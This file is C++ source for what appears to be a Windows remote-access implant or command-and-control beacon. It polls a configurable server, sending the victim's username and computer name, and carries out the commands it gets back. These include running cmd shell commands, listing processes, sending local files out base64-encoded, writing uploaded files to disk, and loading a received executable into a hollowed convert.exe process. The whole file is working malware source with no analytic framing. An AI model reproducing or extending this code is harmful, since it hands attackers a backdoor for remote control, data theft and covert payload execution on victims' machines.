#include "WebServer.h"

struct server_info {
	std::string host;
	int port;
	std::string command;
};

int iSleep = 2000;//milisecond
#define MAX_LEN 256
std::vector<std::string> vt_buf;

std::mutex get_mutex;
std::mutex add_mutex;
std::mutex sleep_mutex;

using json = nlohmann::json;

std::string urlencode(std::string data)
{
	char lookup[] = "0123456789abcdef";

	for (int i = 0; i < data.length(); i++)
	{
		char c = data[i];
		if (!((48 <= c && c <= 57) ||//0-9
			(65 <= c && c <= 90) ||//abc...xyz
			(97 <= c && c <= 122) || //ABC...XYZ
			(c == '-' || c == '_' || c == '.' || c == '~'))
			)
		{
			std::string str = "";
			str = str + "%" + lookup[(c & 0xF0) >> 4] + lookup[(c & 0x0F)];
			data.replace(i, 1, str);
		}
	}

	return data;
}

std::string GetProcessesList()
{
	std::string ret = "";
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		Process32First(hProcessSnap, &pe32);
		do
		{
			ret += std::to_string(pe32.th32ProcessID) + "       ";
			ret += std::to_string(pe32.th32ParentProcessID) + "       ";
			ret += std::string(pe32.szExeFile) + "\n";

		} while (Process32Next(hProcessSnap, &pe32));
	}
	CloseHandle(hProcessSnap);

	return ret;
}

std::string command_shell(std::string command_params)
{
	command_params = "cmd /c " + command_params;

	return  ExecCmd(command_params);
}

std::string command_sleep(std::string command_params)
{
	std::string ret;
	BOOL key = TRUE;
	for (int i = 0; i < command_params.length(); i++)
	{
		if (!(48 <= command_params[i] && command_params[i] <= 57))
		{
			key = FALSE;
			ret = "Command syntax error.";
		}
	}

	if (key)
	{
		int seconds = std::stoi(command_params, nullptr, 0);
		//std::lock_guard<std::mutex> guard(sleep_mutex);
		sleep_mutex.lock();
		iSleep = 1000 + seconds * 1000;
		sleep_mutex.unlock();
		ret = "sleep " + command_params + "s";
	}

	return ret;
}

std::string command_download(std::string command_params, std::string &buffile, std::string &name)
{
	std::string ret;
	DWORD file_size = 0;
	char *buf_file = ReadFile(command_params.c_str(), file_size);
	if (buf_file)
	{
		int base64_len;
		if (file_size % 3)
			base64_len = (file_size / 3 + 1) * 4;
		else
			base64_len = (file_size / 3) * 4;
		char *base64 = (char*)calloc(base64_len + 1, 1);
		if (base64)
		{
			base64_encode((BYTE*)buf_file, (BYTE*)base64, file_size, 0);
			buffile = buffile + (std::string)base64;
			name = name + std::string(PathFindFileNameA(command_params.c_str()));
			ret = "download completed.";

			free(base64);
		}

		free(buf_file);
	}

	return ret;
}

std::string command_upload(json res_json, std::string command_params)
{
	std::string ret;
	std::string base64 = res_json["buf"].get<std::string>();
	char* buf = (char*)calloc(base64.length() + 1, 1);
	if (buf)
	{
		size_t buf_len = base64_decode((BYTE*)base64.c_str(), (BYTE*)buf, base64.length());
		std::string file = "";
		file += "./" + command_params;
		WriteFile(file.c_str(), buf, buf_len);

		ret = "upload completed.";
		free(buf);
	}

	return ret;
}

std::string command_load(json res_json)
{
	std::string ret;
	std::string base64 = res_json["buf"].get<std::string>();
	char *base_exe = (char*)calloc((base64.length() / 4) * 3 + 1, 1);
	if (base_exe)
	{
		DWORD size = base64_decode((BYTE*)base64.c_str(), (BYTE*)base_exe, base64.length());

		BOOL IsWow64;
		IsWow64Process(GetCurrentProcess(), &IsWow64);
		if (IsWow64)
			ret = ExecPE("C:\\Windows\\SysWOW64\\convert.exe", "C:\\Windows\\SysWOW64\\convert.exe", base_exe, size);
		else
			ret = ExecPE("C:\\Windows\\System32\\convert.exe", "C:\\Windows\\System32\\convert.exe", base_exe, size);

		free(base_exe);
	}

	return ret;
}

std::string command_cd(std::string command_params)
{
	if (command_params[1] == ':' && command_params[2] == '\\')
		SetCurrentDirectoryA(command_params.c_str());
	else
	{
		char current_path[MAX_PATH];
		GetCurrentDirectoryA(MAX_PATH, current_path);
		command_params = "\\" + command_params;
		strcat(current_path, command_params.c_str());
		SetCurrentDirectoryA(current_path);
	}

	return "";
}

void WINAPI Interface(LPVOID lpParam)
{
	server_info *sv = (server_info*)lpParam;
	//char buffer[10000] = { 0 };
	//setvbuf(stdout, buffer, _IOFBF, 10000);

	SOCKET s = INVALID_SOCKET;

	WSADATA WSA;
	WSAStartup(MAKEWORD(2, 2), &WSA);

	struct hostent *server = gethostbyname(sv->host.c_str());
	if (server == NULL)
	{
		printf("ERROR, no such host [%s]", sv->host.c_str());
	}
	else
	{
		struct in_addr sin_addr;
		memcpy((char *)&sin_addr.s_addr,
			(char *)server->h_addr,
			server->h_length);
		struct sockaddr_in serv_addr = { 0 };

		s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		if (s == INVALID_SOCKET)
		{
			//DERROR(COMMERROR_SOCK_CODE, sockerror);
			printf("ERROR, socket\n");
		}
		else
		{
			serv_addr.sin_family = AF_INET;
			serv_addr.sin_addr = sin_addr;
			serv_addr.sin_port = htons(sv->port);

			if (connect(s, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0)
			{
				printf("Connect to server failed %d", GetLastError());
				closesocket(s);
				s = INVALID_SOCKET;
			}
			else
			{
				int iResult = send(s, sv->command.c_str(), strlen(sv->command.c_str()), 0);
				Sleep(100);
				fd_set fd_read;

				FD_ZERO(&fd_read);
				FD_SET(s, &fd_read);

				//timeval tv;
				//tv.tv_sec = 0;
				//tv.tv_usec = 100;

				select(0, &fd_read, NULL, nullptr, nullptr);
				if (FD_ISSET(s, &fd_read))
				{
					u_long sztBuf;
					ioctlsocket(s, FIONREAD, &sztBuf);

					if (sztBuf != 0)
					{
						char * pBuf = (char*)calloc(sztBuf + 1, 1);
						std::string str_res = "";
						while (iResult = recv(s, pBuf, sztBuf, 0))
						{
							str_res += std::string(pBuf);
							//puts(pBuf);
							memset(pBuf, 0, sztBuf);
						}

						char *res = strstr((char*)str_res.c_str(), "\r\n\r\n");
						res += strlen("\r\n\r\n");
						str_res = std::string(res);
						if (str_res == "Add OK" || str_res == "Update OK" || str_res == "Response OK")
						{
							//printf("Nothing\n");
						}
						else
						{
							json res_json = json::parse(str_res.c_str());
							int id = res_json["id"].get<int>();
							std::string command = res_json["command"].get<std::string>();
							std::string command_type = command.substr(0, command.find(" "));
							std::string command_params = command.substr(command.find(" ") + 1);
							std::string ret = "";
							std::string buffile = "";
							std::string name = "";
							if (command_type == "shell")
							{							
								ret = command_shell(command_params);
							}
							else if (command_type == "sleep")
							{
								ret = command_sleep(command_params);
							}
							else if (command_type == "download")
							{
								ret = command_download(command_params, buffile, name);
							}
							else if (command_type == "upload")
							{
								ret = command_upload(res_json, command_params);
							}
							else if (command_type == "load")
							{
								ret = command_load(res_json);
							}
							else if (command_type == "ps")
							{
								ret = GetProcessesList();
							}
							else if (command_type == "cd")
							{
								ret = command_cd(command_params);
							}
							else
								ret = "Command not found.";

							if (ret == "")
							{
								//ret = std::string(buffer);
							}

							int base64_len;
							if (ret.length() % 3)
								base64_len = (ret.length() / 3 + 1) * 4;
							else
								base64_len = (ret.length() / 3) * 4;
							char *base64 = (char*)calloc(base64_len + 1, 1);
							if (base64)
							{
								base64_encode((BYTE*)ret.c_str(), (BYTE*)base64, ret.length(), 0);
								std::string str = (std::string)base64;
								std::string json_data = "";
								json_data += "{"\
									"\"id\": " + std::to_string(id) + ","\
									"\"buf\": \"" + buffile + "\","\
									"\"name\": \"" + name + "\","\
									"\"ret\": \"" + str + "\""\
									"}";

								std::lock_guard<std::mutex> guard(add_mutex);
								//add_mutex.lock();
								vt_buf.push_back("POST /response HTTP/1.0\r\n"
									"Content-Type: application/json\r\n"
									"Content-Length: " + std::to_string(json_data.length()) + "\r\n"
									"\r\n"
									+ json_data + "\r\n");
								//add_mutex.unlock();

								free(base64);
							}
						}



						free(pBuf);
					}
				}
			}
		}

		//clean up
		closesocket(s);
		WSACleanup();
	}
}

void WINAPI WebServer()
{
	//PARAM_WebServer *sv = (PARAM_WebServer *)s;

	server_info server;
	server.host = "[host]";//[host]
	server.port = [port];//[port]
	while (true)
	{
		std::string command = "";
		std::lock_guard<std::mutex> guard(get_mutex);
		//get_mutex.lock();
		if (vt_buf.empty())
		{
			std::string username = getenv("username");
			std::string computername = getenv("computername");
			command = "GET /request?Username=" + username + "&ComputerName=" + computername + " HTTP/1.0\r\n\r\n";
		}
		else
		{
			command = vt_buf[0];
			vt_buf.erase(vt_buf.begin());
		}
		//get_mutex.unlock();

		server.command = command;

		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Interface, (LPVOID)&server, 0, 0);
		//Interface((LPVOID)&server);
		
		//printf("OK\n");
		//sleep
		sleep_mutex.lock();
		Sleep(iSleep);	
		sleep_mutex.unlock();
	}	
}